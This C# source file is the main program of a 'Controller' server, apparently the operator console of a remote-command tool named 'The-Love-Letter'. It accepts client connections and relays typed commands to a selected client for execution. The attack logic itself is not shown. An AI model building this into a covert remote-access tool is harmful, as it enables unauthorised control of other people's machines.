using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Console = Colorful.Console;

namespace Controller
{
    class Program
    {
        private static Thread _inputthread;

        /// <summary>
        /// The index of the current client being in control.
        /// </summary>
        public static Server.Client ActiveClient;

        public static Server.Server MainServer;

        private static Commands _cmd = new Commands();
        /// <summary>
        /// Main entry point.
        /// </summary>
        static void Main(string[] args)
        {
            PrintBanner();

            var config = Configuration.LoadConfig();

            Utils.Logging.Write("Starting Controller Server...");

            MainServer = new Server.Server(config);

            MainServer.SuccessfullyConnected += _server_SuccessfullyConnected;

            MainServer.Start();
        }

        private static void _server_SuccessfullyConnected(object sender, EventArgs e)
        {
            _inputthread = new Thread(ParseInput);

            _inputthread.Start();
        }

        private static void ParseInput()
        {
            Console.ResetColor();

            Console.Write("[!] To open help do ", Utils.Logging.GetTypeColor(Utils.Logging.Type.Normal));

            Console.WriteLine($"> help", Utils.Logging.GetTypeColor(Utils.Logging.Type.Success));

            Console.ForegroundColor = Utils.Logging.GetTypeColor(Utils.Logging.Type.Success);


            string input = string.Empty;

            while (true)
            {
                if (input == string.Empty) input = Console.ReadLine();

                var parsedinput = Utils.String.SplitCommandLine(input).ToArray();

                input = string.Empty;

                Type commandtype = _cmd.GetType();

                if (parsedinput.Length <= 0) continue;

                var methods = commandtype.GetMethods().Where(m => m.GetCustomAttributes(typeof(Command), false).Length > 0 && m.Name.ToLower().Trim() == parsedinput[0].ToLower().Trim());

                if (methods.Count() <= 0)
                {
                    Utils.Logging.Write(Utils.Logging.Type.Error, $"No such command exist.");

                    continue;
                } // the method doesnt exist

                var targetmethod = methods.FirstOrDefault();

                object[] parameters = null;

                if (targetmethod.GetParameters().Count() >= 1 && parsedinput.Length > 1) parameters = (object[])parsedinput.Skip(1).ToArray();

                try
                {
                    targetmethod.Invoke(_cmd, parameters);
                }
                catch (TargetParameterCountException ex)
                {
                    Utils.Logging.Write(Utils.Logging.Type.Normal, $"Error, not enough or too many parameters! {Environment.NewLine}{targetmethod.GetCustomAttribute<Command>().Help}");
                }

                while (ActiveClient != null && MainServer.Clients.Contains(ActiveClient))
                {
                    string clientinput = Console.ReadLine();

                    if (ActiveClient != null)
                        ActiveClient.WriteCMD(clientinput);

                    else break;
                }
            }
        }

        public static void PrintBanner()
        {
            var banner = Properties.Resources.Banner;

            Utils.Logging.Write(banner + Environment.NewLine, "FF8474", "583D72");

            Utils.Logging.Write($"{Environment.NewLine}    >>>[Github] https://github.com/AlizerUncaged/The-Love-Letter {String.Concat(Enumerable.Repeat(Environment.NewLine, 2))}", "FF8474", "583D72");


            Console.ResetColor();
        }
    }
}
